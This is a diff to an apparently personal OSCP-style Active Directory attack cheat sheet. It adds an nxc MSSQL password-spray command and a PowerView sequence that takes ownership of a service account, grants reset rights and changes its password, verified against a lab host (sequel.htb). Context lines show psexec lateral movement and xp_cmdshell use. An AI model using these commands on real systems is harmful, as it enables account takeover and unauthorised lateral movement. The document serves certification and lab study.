@@ -194,6 +194,8 @@ export KRB5CCNAME=<ticket.ccache>
 psexec.py -k -no-pass <domain.local>/<user>@<target>
 
 # MSSQL lateral movement (if enumerated)
+nxc mssql $target -u usernames.txt -p 'MSSQLP@ssw0rd!' --local-auth
+
 mssqlclient.py <domain.local>/<user>:'<pass>'@<target> -windows-auth
 # inside: EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';
 # SQL> enable_xp_cmdshell 
@@ -303,3 +305,23 @@ Note: DCSync (§9) and Golden Ticket are the classic end-state — everything be
 ---
 
 **Documentation reminder:** for every command above, log _which enumeration output_ justified running it (e.g. "ran GetUserSPNs because BloodHound showed 3 SPN-set accounts") — OSCP reports are graded on demonstrated reasoning, not just successful exploitation.
+
+# WriteOwner - Change Password
+
+We have 'ryan', the 'ca_svc' is the target:
+```powershell
+Import-Module .\PowerView.ps1
+
+Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
+
+Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
+
+$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
+
+Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
+```
+
+Check:
+```sh
+nxc smb sequel.htb -u ca_svc -p 'Password123!!'
+```
